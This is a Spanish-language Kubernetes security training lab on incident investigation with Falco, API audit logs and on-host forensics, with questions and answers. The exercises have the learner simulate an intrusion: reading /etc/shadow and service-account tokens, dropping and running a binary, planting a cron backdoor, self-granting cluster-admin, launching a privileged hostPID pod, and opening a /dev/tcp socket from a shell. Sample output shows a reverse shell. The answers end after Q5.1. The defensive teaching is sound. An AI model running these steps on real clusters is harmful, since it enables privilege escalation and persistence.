# CKS 6.3 — Investigar e identificar fases de ataque y actores maliciosos dentro del entorno

> **Dominio:** Monitoring, Logging and Runtime Security · **Peso en el examen:** 4
> **Objetivo de estos ejercicios:** dado un incidente *en vivo*, reconstruir **qué pasó, en qué orden y quién lo hizo** correlacionando tres fuentes de evidencia independientes — la **capa de runtime** (Falco/syscalls), la **capa del control-plane** (log de auditoría de Kubernetes) y la **forense on-host** (`/proc`, `crictl`, `nsenter`) — y luego mapear cada observación a una fase de la matriz **MITRE ATT&CK for Containers**.
>
> Material de referencia usado a lo largo del documento:
> - MITRE ATT&CK for Containers matrix — https://attack.mitre.org/matrices/enterprise/containers/
> - Falco rules & fields reference — https://falco.org/docs/reference/rules/ y ruleset por defecto https://github.com/falcosecurity/rules
> - Kubernetes Auditing — https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
> - Kubernetes Audit Policy reference — https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/

**Supuestos del laboratorio.** Un clúster kubeadm (v1.34) donde tenés `root` en el nodo del control-plane y en al menos un worker. Falco ≥ 0.38 está instalado en los workers con su ruleset por defecto (`journalctl -u falco -f` muestra eventos). Donde un paso deba correr en un nodo, está marcado `# on node`. Tratá el workload `victim` de abajo como una aplicación en la que un atacante ya obtuvo un punto de apoyo — vos sos quien responde al incidente.

---

## Exercise 1 — Reconstruir una intrusión a partir de eventos de Falco y mapearla a fases de ATT&CK

Vas a *hacer de atacante* en un pod descartable para generar una traza de eventos realista, y luego cambiar de sombrero y leer esa traza como lo haría un SRE de guardia.

### Steps

1. Iniciá un tail de la salida de Falco en el worker en una segunda terminal para ver los eventos aterrizar en tiempo real:
   ```bash
   # on node
   journalctl -u falco -f -o cat
   ```

2. Desplegá el workload objetivo y confirmá que se agenda al worker que estás siguiendo:
   ```bash
   kubectl run victim --image=nginx:1.27 --restart=Never
   kubectl get pod victim -o wide
   ```

3. Simulá el **acceso inicial manos-al-teclado** haciendo exec de una shell interactiva — esta es la primitiva más importante que abusa un atacante:
   ```bash
   kubectl exec -it victim -- bash
   ```
   Evento esperado de Falco:
   ```
   Notice A shell was spawned in a container with an attached terminal
   (evt_type=execve user=root user_uid=0 user_loginuid=-1 process=bash
   proc_exepath=/usr/bin/bash parent=runc command=bash terminal=34816
   container_id=8f3c... container_image=docker.io/library/nginx
   container_name=victim k8s_ns=default k8s_pod_name=victim)
   Rule: Terminal shell in container
   ```

4. Dentro de la shell, ejecutá esta secuencia (cada comando está elegido para disparar una regla por defecto *distinta*):
   ```bash
   # (a) local discovery + credential access
   cat /etc/shadow
   cat /run/secrets/kubernetes.io/serviceaccount/token

   # (b) reach the API server from inside the workload
   apt-get update && apt-get install -y curl 2>/dev/null
   curl -sk https://kubernetes.default.svc/api --header \
     "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)"

   # (c) drop and run a new binary (second-stage payload stand-in)
   cp /bin/sleep /tmp/kworker && /tmp/kworker 3 &

   # (d) tamper with an on-disk config to persist
   echo 'evil' > /etc/cron.d/backdoor
   exit
   ```

5. De vuelta en el nodo, capturá los eventos emitidos durante esa ventana en un archivo para poder trabajarlos como un dataset:
   ```bash
   # on node
   journalctl -u falco --since "-5min" -o cat | grep -Eo 'Rule: .*' | sort | uniq -c
   ```
   Salida representativa:
   ```
      1 Rule: Contact K8S API Server From Container
      1 Rule: Drop and execute new binary in container
      1 Rule: Launch Package Management Process in Container
      1 Rule: Read sensitive file untrusted
      1 Rule: Terminal shell in container
      1 Rule: Write below etc
   ```

**Chequeo de comprensión — bloque 1**

- **Q1.1** Falco reportó `user=root user_uid=0` para la shell, y sin embargo la lanzaste con `kubectl exec` bajo la identidad de tu propio kubeconfig. ¿Por qué Falco muestra `root`/`uid=0` y no tu nombre de usuario, y qué log consultarías para recuperar al *humano* que ejecutó el exec?
- **Q1.2** Mapeá cada una de las seis reglas de arriba a una única táctica de **MITRE ATT&CK for Containers** (Execution, Discovery, Credential Access, Persistence, etc.). ¿Cuál es la única regla que constituye el indicador más fuerte de que esto es un compromiso *interactivo* y no la app comportándose mal?
- **Q1.3** Falco enriqueció el evento con `k8s_ns`, `k8s_pod_name` y `container_image`. ¿De dónde viene esa metadata, y qué se rompe en tu triage si aparece vacía (`k8s_pod_name=<NA>`)?
- **Q1.4** `Drop and execute new binary in container` se disparó para `/tmp/kworker`. Explicá el comportamiento a nivel de syscall en el que se basa esa regla, y por qué simplemente *copiar* un binario sin ejecutarlo no la dispararía.

---

## Exercise 2 — Atribuir el ataque a un actor malicioso usando el log de auditoría de Kubernetes

Falco te dice *qué pasó en el host*. No puede decirte *qué identidad de la API* creó el pod privilegiado, robó el Secret por la API, o se otorgó a sí mismo `cluster-admin`. Esa atribución vive únicamente en el **log de auditoría del kube-apiserver**.

### Steps

1. Redactá una política de auditoría que capture los verbos de alta señal sin filtrar el *contenido* de los Secrets:
   ```bash
   # on control-plane node
   mkdir -p /etc/kubernetes/audit /var/log/kubernetes/audit
   cat >/etc/kubernetes/audit/policy.yaml <<'EOF'
   apiVersion: audit.k8s.io/v1
   kind: Policy
   omitStages: ["RequestReceived"]
   rules:
     # exec/attach/portforward: full request+response, these are hands-on-keyboard
     - level: RequestResponse
       resources:
         - group: ""
           resources: ["pods/exec", "pods/attach", "pods/portforward"]
     # RBAC changes: capture the granted role so we see privilege escalation
     - level: RequestResponse
       resources:
         - group: "rbac.authorization.k8s.io"
           resources: ["clusterrolebindings", "rolebindings", "clusterroles", "roles"]
     # Secrets: Metadata ONLY — record the access, never the payload
     - level: Metadata
       resources:
         - group: ""
           resources: ["secrets"]
     # Pod lifecycle
     - level: Request
       verbs: ["create", "delete"]
       resources:
         - group: ""
           resources: ["pods"]
     # Everything else, minimally
     - level: Metadata
   EOF
   ```

2. Conectá la política al static pod del API server y reinicialo (el kubelet vuelve a crear el pod cuando cambia el manifiesto):
   ```bash
   # on control-plane node, edit /etc/kubernetes/manifests/kube-apiserver.yaml
   # under spec.containers[0].command, add:
   #   - --audit-policy-file=/etc/kubernetes/audit/policy.yaml
   #   - --audit-log-path=/var/log/kubernetes/audit/audit.log
   #   - --audit-log-maxage=30
   #   - --audit-log-maxbackup=10
   #   - --audit-log-maxsize=100
   #
   # and mount the two host paths into the container:
   #   volumeMounts:
   #     - name: audit-policy
   #       mountPath: /etc/kubernetes/audit/policy.yaml
   #       readOnly: true
   #     - name: audit-log
   #       mountPath: /var/log/kubernetes/audit
   #   volumes:
   #     - name: audit-policy
   #       hostPath: { path: /etc/kubernetes/audit/policy.yaml, type: File }
   #     - name: audit-log
   #       hostPath: { path: /var/log/kubernetes/audit, type: DirectoryOrCreate }
   ```
   Confirmá que el API server volvió y está escribiendo eventos:
   ```bash
   crictl ps | grep kube-apiserver
   tail -n1 /var/log/kubernetes/audit/audit.log | jq .verb
   ```

3. Generá una traza realista de "actor malicioso" a partir de un *token de service account* (la credencial que el atacante robó en el Exercise 1), no tu kubeconfig de admin — así es como se ve el movimiento lateral real:
   ```bash
   # attacker escalates: privileged pod + a self-granted cluster-admin binding + secret theft
   kubectl create clusterrolebinding pwn --clusterrole=cluster-admin \
     --serviceaccount=default:default
   kubectl run rootpod --image=alpine --restart=Never --privileged \
     --overrides='{"spec":{"hostPID":true,"containers":[{"name":"c","image":"alpine","command":["sleep","3600"],"securityContext":{"privileged":true}}]}}'
   kubectl get secret -A
   kubectl exec -it victim -- id
   ```

4. Ahora investigá. **¿Quién hizo exec en pods, desde qué IP de origen, y cuándo?**
   ```bash
   jq -r 'select(.objectRef.subresource=="exec")
     | [.requestReceivedTimestamp, .user.username, .sourceIPs[0],
        (.objectRef.namespace+"/"+.objectRef.name)] | @tsv' \
     /var/log/kubernetes/audit/audit.log
   ```
   ```
   2026-08-05T14:22:31Z   kubernetes-admin   10.0.7.14    default/victim
   ```

5. **¿Quién otorgó cluster-admin, y a quién?** (la consulta de escalada más importante)
   ```bash
   jq -r 'select(.objectRef.resource=="clusterrolebindings" and .verb=="create")
     | {when:.requestReceivedTimestamp, who:.user.username, from:.sourceIPs,
        binding:.objectRef.name,
        role:.requestObject.roleRef.name,
        subjects:[.requestObject.subjects[]?.name]}' \
     /var/log/kubernetes/audit/audit.log
   ```
   ```json
   {
     "when": "2026-08-05T14:22:05Z",
     "who": "kubernetes-admin",
     "from": ["10.0.7.14"],
     "binding": "pwn",
     "role": "cluster-admin",
     "subjects": ["default"]
   }
   ```

6. **¿Qué identidades tocaron Secrets, y con qué amplitud?**
   ```bash
   jq -r 'select(.objectRef.resource=="secrets" and (.verb=="get" or .verb=="list" or .verb=="watch"))
     | [.requestReceivedTimestamp, .user.username, .verb,
        (.objectRef.namespace // "ALL")] | @tsv' \
     /var/log/kubernetes/audit/audit.log | sort | uniq -c | sort -rn | head
   ```

7. **Barré en busca de acceso no autenticado / anónimo** — un clásico punto de apoyo de acceso inicial en clústeres mal configurados:
   ```bash
   jq -r 'select(.user.username=="system:anonymous")
     | [.requestReceivedTimestamp, .sourceIPs[0], .verb, .requestURI,
        .responseStatus.code] | @tsv' \
     /var/log/kubernetes/audit/audit.log
   ```

**Chequeo de comprensión — bloque 2**

- **Q2.1** En la política, los Secrets se loguean con `level: Metadata` mientras que `pods/exec` está en `RequestResponse`. Enunciá el riesgo concreto contra el que se defiende la regla de Secret, y qué capacidad investigativa *resignás* al elegir `Metadata` ahí.
- **Q2.2** Tu consulta de `clusterrolebindings` leyó `.requestObject.roleRef.name` para conocer el rol otorgado. ¿Qué `level` de auditoría es el *mínimo* requerido para que `.requestObject` esté poblado, y qué contendría ese campo con `level: Metadata`?
- **Q2.3** La consulta de exec atribuyó la acción a `kubernetes-admin` desde `10.0.7.14`. En un incidente real el atacante aparecería como `system:serviceaccount:default:default`. Escribí el selector `jq` que aísla *todas* las acciones realizadas por un service account comprometido específico, y explicá por qué `sourceIPs` sigue siendo valioso aun cuando el nombre de usuario es un service account.
- **Q2.4** Está seteado `omitStages: ["RequestReceived"]`. ¿Por qué descartar la etapa `RequestReceived` es seguro y deseable, y qué etapa *conservarías* para probar que una acción efectivamente tuvo efecto en vez de solo haber sido intentada?
- **Q2.5** Aplicaste el cambio de la política de auditoría directamente en `kube-apiserver.yaml` sobre un control plane en vivo. Si el API server **no** reinicia después de tu edición, nombrá los dos errores más probables (uno en los flags, uno en los volumes) y cómo los diagnosticarías desde el nodo.

---

## Exercise 3 — Forense on-host: fijar el proceso, sus sockets y su persistencia

El log de auditoría te da la atribución a nivel API; Falco te da el evento de syscall. Para *acotar el radio de impacto* debés inspeccionar el contenedor en vivo desde el nodo: su árbol de procesos, conexiones de red abiertas, archivos dropeados, y el entorno (a menudo lleno de credenciales filtradas).

### Steps

1. A partir de la evidencia de auditoría/Falco sabés que el pod es `victim` en este worker. Encontrá su contenedor de runtime y su PID **sin** confiar en nada dentro del contenedor:
   ```bash
   # on node
   CID=$(crictl ps --name victim -q)
   PID=$(crictl inspect --output go-template --template '{{.info.pid}}' "$CID")
   echo "container=$CID host-pid=$PID"
   ```

2. Reconstruí el **árbol de procesos** tal como lo ve el host (un atacante no puede esconderse del namespace de PID del host):
   ```bash
   ps -o pid,ppid,user,stat,etime,cmd --ppid "$PID" --pid "$PID" -H
   # or, broader, the whole subtree:
   ps -e -o pid,ppid,cmd --forest | grep -A20 -w "$PID"
   ```
   Estás buscando la señal delatora de una intrusión en vivo: una `bash`/`sh` de larga duración sin servicio controlador, o un binario inesperado como `/tmp/kworker`.

3. Enumerá las **conexiones de red en vivo** del contenedor entrando solo a su namespace de red (no a su filesystem, que puede estar manipulado):
   ```bash
   nsenter -t "$PID" -n ss -tunap
   ```
   ```
   Netid State  Local Address:Port   Peer Address:Port    Process
   tcp   ESTAB  10.244.1.23:44170    185.220.101.7:4444   users:(("bash",pid=...))
   ```
   Una **conexión de egress ESTABLISHED que pertenece a una shell** hacia un host/puerto externo es una reverse shell hasta que se demuestre lo contrario.

4. Inspeccioná lo que el atacante **dropeó y dónde persistió**, viendo el filesystem raíz del contenedor desde el host vía `/proc/<pid>/root` (evita cualquier manipulación in-container de `ls`/`cat`):
   ```bash
   ls -la --time-style=full-iso /proc/$PID/root/tmp/
   cat /proc/$PID/root/etc/cron.d/backdoor
   # recently modified files across the container rootfs (last 15 min):
   find /proc/$PID/root -xdev -type f -mmin -15 2>/dev/null | grep -vE '/proc|/sys'
   ```

5. Volcá el **entorno** del proceso — frecuentemente donde se filtran credenciales de cloud/API:
   ```bash
   tr '\0' '\n' < /proc/$PID/environ
   ```

6. Preservá la evidencia *antes* de matar nada (el orden importa — un borrado duro destruye el estado volátil):
   ```bash
   crictl inspect "$CID"  > /root/ir/victim-inspect.json
   nsenter -t "$PID" -n ss -tunap > /root/ir/victim-sockets.txt
   cp -a /proc/$PID/root/tmp/kworker /root/ir/ 2>/dev/null
   # only now contain:
   kubectl label pod victim quarantine=true
   kubectl cordon <this-node>   # if node-level compromise is suspected
   ```

**Chequeo de comprensión — bloque 3**

- **Q3.1** Toda inspección de filesystem y de sockets de arriba pasó por `crictl`/`nsenter`/`/proc/$PID/root` **desde el nodo**, nunca por `kubectl exec`. Da las dos razones independientes por las que esto importa durante un incidente activo.
- **Q3.2** `ss` mostró una conexión *que pertenece a `bash`*. ¿Por qué el proceso propietario, y no la IP de destino por sí sola, es la pieza de evidencia decisiva para calificar esto como una reverse shell?
- **Q3.3** En el paso 6 capturaste los sockets y el binario dropeado *antes* de borrar el pod. Ordená estas tres acciones por "volatilidad" (lo más perecedero primero): las conexiones de red abiertas, el archivo `/etc/cron.d/backdoor`, las entradas del log de auditoría del pod — y justificá el orden.
- **Q3.4** El atacante tenía `hostPID: true` en `rootpod` (Exercise 2, paso 3). Explicá cómo ese único campo convierte un compromiso de contenedor en un compromiso de *nodo*, y qué inspeccionarías adicionalmente desde el host una vez que lo veas.

---

## Exercise 4 — Cerrar la brecha de visibilidad: escribir una regla Falco personalizada para la fase que se te escapó

Leer la traza muestra que el ruleset por defecto marcó la shell y el binario dropeado, pero el **egress de la reverse shell** del Exercise 3 (una shell abriendo un socket saliente) *no* estaba cubierto por una regla dedicada. La ingeniería de detección cierra esa brecha.

### Steps

1. Creá un archivo de reglas que reutilice los macros/lists del ruleset por defecto (`outbound`, `shell_binaries`) y agregue una allow-list que vos controlás:
   ```yaml
   # /etc/falco/rules.d/reverse-shell.yaml
   - list: allowed_outbound_destinations
     items: []   # e.g. internal proxy IPs the app is *supposed* to reach

   - rule: Outbound Connection From Shell In Container
     desc: >
       A shell process inside a container opened an outbound network connection to
       a destination not on the allow-list. Interactive shells do not normally
       initiate egress; this pattern matches reverse shells and second-stage
       payload pulls (MITRE Command and Control / Execution).
     condition: >
       outbound and container
       and proc.name in (shell_binaries)
       and not fd.sip in (allowed_outbound_destinations)
     output: >
       Outbound connection from shell in container
       (user=%user.name process=%proc.name cmdline=%proc.cmdline
        connection=%fd.name server=%fd.sip:%fd.sport
        container=%container.name image=%container.image.repository
        pod=%k8s.pod.name ns=%k8s.ns.name)
     priority: CRITICAL
     tags: [container, network, mitre_command_and_control, T1071]
   ```

2. Validá la sintaxis *antes* de recargar — un archivo de reglas roto puede crashear el engine o, peor, deshabilitar silenciosamente la carga de reglas:
   ```bash
   # on node
   falco --validate /etc/falco/rules.d/reverse-shell.yaml
   ```
   ```
   Ok
   ```

3. Asegurate de que el archivo esté en el path de carga `rules_files` de Falco (el packaging por defecto carga `/etc/falco/rules.d/`), luego recargá el engine sin un restart completo:
   ```bash
   kill -1 "$(pidof falco)"      # SIGHUP triggers a hot reload
   journalctl -u falco --since "-30s" -o cat | grep -i 'rules file'
   ```

4. Probala de punta a punta (verdadero positivo) y luego confirmá que **no** se dispara para una app legítima haciendo egress (verdadero negativo):
   ```bash
   # true positive: shell opens a socket
   kubectl exec -it victim -- sh -c 'exec 3<>/dev/tcp/example.com/80; echo done >&3'
   # true negative: the nginx worker serving traffic should NOT match
   curl -s http://$(kubectl get pod victim -o jsonpath='{.status.podIP}') >/dev/null
   ```

**Chequeo de comprensión — bloque 4**

- **Q4.1** La condición de la regla es `outbound and container and proc.name in (shell_binaries) and not fd.sip in (allowed_outbound_destinations)`. Explicá qué aporta cada una de las cuatro cláusulas, y predecí el modo de falla si quitaras la cláusula `and container` en un worker node ocupado.
- **Q4.2** `/dev/tcp` es un **builtin de bash**, así que no se hace `execve` de un proceso separado para la conexión en sí. Explicá por qué basar esta regla en el evento `outbound` (de red) en vez de en `spawned_process` es lo que hace que se dispare siquiera para una reverse shell con `/dev/tcp`.
- **Q4.3** Seteaste `priority: CRITICAL` y etiquetaste `mitre_command_and_control`. ¿Por qué importan los `tags` operativamente más allá de la documentación, y cómo usaría un pipeline de alertas `priority` de forma distinta a `tags`?
- **Q4.4** Un compañero propone en cambio detectar reverse shells alertando ante *cualquier* conexión al puerto 4444. Da dos razones por las que la regla basada en comportamiento (shell + egress) es más robusta que la basada en puerto, y una situación en la que la regla de puerto igual aporta valor.

---

## Exercise 5 — Síntesis: armar la línea de tiempo de la kill-chain

Ahora tenés tres flujos de evidencia. Correlacionalos en una única narrativa — este es exactamente el entregable que espera una revisión de incidente.

### Steps

1. Extraé una vista unificada y ordenada por timestamp tirando los campos clave de cada fuente a un `TSV` común:
   ```bash
   # control-plane events (audit)
   jq -r '[.requestReceivedTimestamp, "AUDIT", .user.username,
           (.verb+" "+(.objectRef.resource // "")+"/"+(.objectRef.subresource // "")),
           .sourceIPs[0]] | @tsv' /var/log/kubernetes/audit/audit.log > /tmp/tl-audit.tsv

   # runtime events (falco) — Falco can emit JSON if json_output=true in falco.yaml
   journalctl -u falco --since "-1h" -o cat \
     | sed -E 's/^([0-9:.]+): (\w+) (.*)Rule: (.*)$/\1\tFALCO\t\4\t\3/' > /tmp/tl-falco.tsv

   sort -k1,1 /tmp/tl-audit.tsv /tmp/tl-falco.tsv | column -t -s$'\t' | less
   ```

2. Recorré la línea de tiempo ordenada y etiquetá cada fila con su fase de ATT&CK, produciendo una tabla como:

   | Time (UTC) | Source | Phase (ATT&CK for Containers) | Evidence |
   |---|---|---|---|
   | 14:21:58 | AUDIT | Initial Access — Valid Accounts | first API call from `10.0.7.14` |
   | 14:22:02 | FALCO | Execution (T1609) | `Terminal shell in container` on `victim` |
   | 14:22:03 | FALCO | Credential Access (T1552) | `Read sensitive file untrusted` `/run/secrets/.../token` |
   | 14:22:04 | FALCO | Discovery (T1613) | `Contact K8S API Server From Container` |
   | 14:22:05 | AUDIT | Privilege Escalation (T1078) | `create clusterrolebindings/ pwn → cluster-admin` |
   | 14:22:09 | AUDIT | Persistence (T1610) | `create pods/ rootpod` (`privileged`, `hostPID`) |
   | 14:22:31 | FALCO | Command & Control (T1071) | `Outbound Connection From Shell In Container` |
   | 14:22:40 | FALCO | Persistence (T1053) | `Write below etc` `/etc/cron.d/backdoor` |

**Chequeo de comprensión — bloque 5**

- **Q5.1** Dos de tus filas comparten el mismo timestamp con granularidad de segundo pero el orden *causal* importa (la lectura del token debe preceder al contacto con la API). Cuando los timestamps de Falco y de auditoría difieren en unos pocos segundos, ¿qué problema de reloj/skew debés tener en cuenta antes de afirmar un ordenamiento, y cómo hacés comparables ambas fuentes?
- **Q5.2** La línea de tiempo muestra Credential Access (lectura del token) *antes* del contacto con la API. Explicá por qué ese ordenamiento es el pivote que prueba *movimiento lateral vía el propio service account del workload*, en vez de que el admin simplemente esté administrando el clúster.
- **Q5.3** Exactamente una fase de la tabla es demostrable **solo** desde el log de auditoría y sería invisible para Falco, y exactamente una es demostrable **solo** desde Falco e invisible para el log de auditoría. Nombrá ambas y explicá el límite entre los dos telescopios.

---

<details>
<summary><strong>Answers</strong></summary>

### Exercise 1

**Q1.1** Falco reporta la identidad *dentro de los namespaces del contenedor tal como la ve el kernel*. `kubectl exec` corre `runc`/`crictl exec` en el nodo, que spawnea tu shell como el usuario del proceso del contenedor — acá `root` (uid 0), porque la imagen de nginx corre como root. Falco lee syscalls, no la API de Kubernetes, así que no tiene noción de tu identidad de kubeconfig (`user_loginuid=-1` confirma que no se seteó ningún uid de login/auditoría). Para recuperar al *humano*, debés consultar el **log de auditoría del kube-apiserver** — el evento `pods/exec` lleva `.user.username` y `.sourceIPs`. Los logs de runtime y de control-plane son complementarios: ninguno por sí solo atribuye un exec interactivo a una persona en un nodo.

**Q1.2** Mapeo:
- `Terminal shell in container` → **Execution** (T1609 Container Administration Command).
- `Read sensitive file untrusted` (`/etc/shadow`) → **Credential Access** / Discovery.
- `Contact K8S API Server From Container` → **Discovery** (T1613 Container and Resource Discovery).
- `Launch Package Management Process in Container` → **Defense Evasion / Execution** (instalar herramientas en runtime).
- `Drop and execute new binary in container` → **Execution / Persistence** (payload de segunda etapa).
- `Write below etc` (`/etc/cron.d/backdoor`) → **Persistence** (T1053 Scheduled Task/Job).

El indicador más fuerte de un compromiso *interactivo* es **`Terminal shell in container` con una terminal adjunta** — los contenedores de producción casi nunca tienen una shell interactiva con TTY; un proceso de aplicación comportándose mal no asigna un PTY.

**Q1.3** Los campos `k8s_ns`/`k8s_pod_name`/`container_image` vienen del **enriquecimiento de metadata de contenedor/Kubernetes de Falco**: resuelve el container ID (a partir del cgroup/evento `clone`) contra el runtime de contenedores (containerd/CRI-O) y, cuando está configurado, contra el API server, para adjuntar la identidad del pod. Si aparece `<NA>`, perdés la capacidad de pivotear de un evento de syscall del host a *qué workload* le pertenece — te quedarías solo con un container ID y tendrías que resolverlo manualmente vía `crictl ps`/`crictl inspect`. Causas comunes: el plugin de metadata / la conexión `-k` a la API está caída, o el evento se disparó antes de que el enriquecimiento se completara.

**Q1.4** `Drop and execute new binary in container` se basa en un **`execve` de un archivo cuyo inode fue creado/modificado *después* de que el contenedor arrancó** (es decir, no forma parte de la capa de imagen de solo lectura). La regla combina una escritura/creación de un ejecutable con un `execve` posterior de esa misma ruta. Solo hacer `cp` del binario produce únicamente un evento de escritura; sin el `execve`, la condición de "ejecutar nuevo binario" no se satisface — que es exactamente por qué el `&& /tmp/kworker` importa.

---

### Exercise 2

**Q2.1** Loguear Secrets con `RequestResponse` (o incluso `Request`) escribiría el **payload `data` del Secret — la credencial en texto plano — dentro del log de auditoría**, convirtiendo tu log de auditoría en un almacén de credenciales de alto valor que un atacante (o un log shipper demasiado amplio) puede saquear. `Metadata` registra *que* la identidad X hizo `get secret/foo en ns bar en el momento T`, que es todo lo que necesitás para detección y atribución. Lo que resignás: no podés probar *qué campos/valores específicos* se devolvieron, solo que el objeto fue accedido.

**Q2.2** `.requestObject` está poblado a partir de **`level: Request`** (Request loguea el objeto entrante; RequestResponse agrega el objeto de respuesta del API server). Con `level: Metadata`, `.requestObject` está **ausente por completo** — verías que el binding fue creado y por quién, pero no que referenciaba `cluster-admin`. Por eso la regla de RBAC está seteada en `RequestResponse`.

**Q2.3** Selector:
```bash
jq -r 'select(.user.username=="system:serviceaccount:default:default")
  | [.requestReceivedTimestamp, .verb, .objectRef.resource,
     (.objectRef.namespace // "-"), .sourceIPs[0]] | @tsv' audit.log
```
`sourceIPs` sigue siendo valioso porque un token de service account es *portable*: la misma identidad usada legítimamente por un pod en el clúster que de pronto aparece desde una **IP de origen inesperada** (un nuevo nodo, una IP de egress externa, la laptop de un desarrollador) es evidencia fuerte de que el token fue exfiltrado y está siendo reproducido desde fuera del clúster. El nombre de usuario te dice *qué* credencial; `sourceIPs` te dice *si su uso es anómalo*.

**Q2.4** `RequestReceived` se emite en el instante en que el API server *recibe* la solicitud, antes de authn/authz/admission — duplica el volumen de eventos y no contiene ningún resultado, así que descartarlo es pura reducción de ruido sin pérdida. Conservás la etapa **`ResponseComplete`** (y `Panic`), porque solo una respuesta completada con `.responseStatus.code` prueba que la acción *tuvo éxito* (`201`/`200`) frente a que fue *intentada y denegada* (`403`). Distinguir "intentó agarrar el Secret" de "agarró el Secret" es central para acotar el impacto.

**Q2.5** Fallas más probables: (1) **typo en el flag / ruta equivocada** — `--audit-policy-file` apunta a una ruta que no está montada dentro del contenedor, así que el API server del kubelet entra en crashloop al arrancar; (2) **`hostPath` volume + `volumeMount` faltante/incorrecto** para el archivo de política o el directorio de logs, así que el archivo es invisible dentro del contenedor. Diagnosticá desde el nodo con `crictl ps -a | grep apiserver` (verlo en crashloop), luego `crictl logs <apiserver-container-id>` para el error exacto de "no such file" / parseo de flags. Como es un static pod, también revisá `journalctl -u kubelet` en busca de errores de manifiesto. Guardá un backup del manifiesto antes de editar.

---

### Exercise 3

**Q3.1** (1) **Integridad de las herramientas:** un atacante con un punto de apoyo puede haber reemplazado `ls`, `cat`, `ps` o la shell misma dentro del contenedor; `kubectl exec` corre *sus* binarios y devuelve *sus* mentiras. `crictl`/`nsenter`/`/proc/$PID/root` usan los binarios confiables del **host** y la propia vista del kernel. (2) **Preservación de evidencia / no perturbación:** `kubectl exec` spawnea un nuevo proceso dentro del contenedor, mutando el estado volátil (nuevos PIDs, nuevos eventos, posiblemente disparando los propios tripwires del atacante o su lógica anti-forense). La inspección del lado del host está mucho más cerca de ser de solo lectura.

**Q3.2** La IP/puerto de destino por sí sola es ambigua — un montón de workloads legítimamente hablan al `:443`, e incluso `:4444` podría ser un servicio benigno. Lo que la convierte en una reverse shell es que el **proceso propietario es una shell interactiva** (`bash`/`sh`) en vez del propio binario de la aplicación. Una shell que sostiene un socket de egress ESTABLISHED no tiene ningún propósito legítimo en un contenedor; esa propiedad es la señal, la dirección es meramente el indicador sobre el cual pivotear.

**Q3.3** De más → menos volátil: **(1) las conexiones de red abiertas** — se desvanecen en el instante en que el proceso o pod muere y nunca son recuperables; **(2) el archivo `/etc/cron.d/backdoor`** — persiste en la capa escribible del contenedor hasta que el pod/contenedor es borrado, pero se pierde cuando hacés `kubectl delete pod`; **(3) las entradas del log de auditoría** — ya escritas de forma duradera a disco en el control plane e independientes del ciclo de vida del pod. El Orden de Volatilidad dicta que captures primero los sockets/memoria en vivo, luego los artefactos en disco, y luego confíes en los logs ya persistidos — que es exactamente por qué el paso 6 hace snapshot de los sockets y copia el binario *antes* de cualquier `delete`.

**Q3.4** `hostPID: true` coloca al contenedor en el **namespace de PID del host**, de modo que sus procesos pueden ver y (con capabilities suficientes/privileged) señalizar o inspeccionar vía `nsenter`/`/proc` *cada proceso en el nodo*, incluyendo el kubelet y otros pods — habilitando leer la memoria/`/proc/<pid>/environ` de otros contenedores, inyectar en procesos del host, o `nsenter -t 1` para escapar al namespace de montaje del host. Una vez que lo veas, inspeccioná adicionalmente desde el host: `ps -ef` para acceso cruzado entre contenedores por los procesos de ese contenedor, breakouts vía `/proc/<hostpid>/root`, unidades cron/systemd del host, `~/.ssh/authorized_keys`, y cualquier credencial a nivel de nodo (kubeconfig del kubelet, IMDS de cloud).

---

### Exercise 4

**Q4.1** Cláusulas: `outbound` (un evento de *connect* de red — el disparador), `container` (acotar a workloads containerizados, no a daemons del host), `proc.name in (shell_binaries)` (solo shells — el discriminador conductual), `not fd.sip in (allowed_outbound_destinations)` (suprimir el egress sancionado para recortar falsos positivos). Quitá `and container` y la regla ahora matchea **toda shell en el nodo que abra un socket** — incluyendo tus propias sesiones de `journalctl`/admin y scripts del sistema corriendo en el host — produciendo una avalancha de alertas que hará que la regla se silencie, derrotando su propósito.

**Q4.2** Una redirección `/dev/tcp/host/port` es manejada *dentro* del proceso bash en ejecución como un builtin; el kernel ve una syscall `connect()` pero **ningún `execve` nuevo**. Una regla basada en `spawned_process` por lo tanto nunca se dispararía — no hay proceso hijo que matchear. Basarla en el evento `outbound` (connect de red) atrapa el `connect()` sin importar si un binario separado (`nc`, `curl`) o un builtin de shell realizó la conexión, que es lo que la hace robusta contra reverse shells fileless/basadas en builtins.

**Q4.3** `priority` es una señal de *severidad* que el pipeline de alertas usa para **rutear y paginar** (ej. CRITICAL → PagerDuty ahora, NOTICE → solo dashboard) y para aplicar umbrales/rate-limit. Los `tags` son *clasificación/metadata* usados para **filtrar, agrupar y correlacionar** — ej. construir un heatmap de cobertura ATT&CK, rutear todos los eventos `mitre_command_and_control` al canal de threat-intel, o suprimir un tag ruidoso en un namespace. La priority responde "¿qué tan fuerte?"; los tags responden "¿de qué tipo, y cómo encaja en la kill chain?".

**Q4.4** La basada en comportamiento (shell + egress) es más robusta porque: (1) es **agnóstica al puerto** — los atacantes mueven trivialmente el C2 fuera del 4444 al 443/53, derrotando una regla de puerto estático; (2) captura la *intención* (una shell hablándole a la red) en vez de un número casual, así que sobrevive a los cambios de infraestructura. La regla de puerto igual aporta valor como un **complemento barato y de alta confianza** cuando tenés threat intel sobre un endpoint/puerto de C2 *específico* conocido-malo — un match de IOC dirigido que se dispara aun cuando el proceso no es una shell (ej. una biblioteca inyectada haciendo beaconing).

---

### Exercise 5

**Q5.1** Los timestamps de Falco vienen del **reloj del worker node** (tiempo del evento de syscall); los timestamps de auditoría vienen del **reloj del control-plane** (`requestReceivedTimestamp`). Si los relojes de los nodos derivan, el ordenamiento sub-segundo a través de las dos fuentes es poco confiable. Antes de afirmar un orden causal debés confirmar que **NTP/chrony esté sincronizado** en ambos nodos (e idealmente acotar el skew), y normalizar ambos flujos a **UTC** (auditoría ya está en UTC/RFC3339; asegurate de que la salida de Falco también). Dentro de una *única* fuente, el ordenamiento es confiable; a través de fuentes, tratá los timestamps cercanos como concurrentes a menos que el skew sea conocido-pequeño.

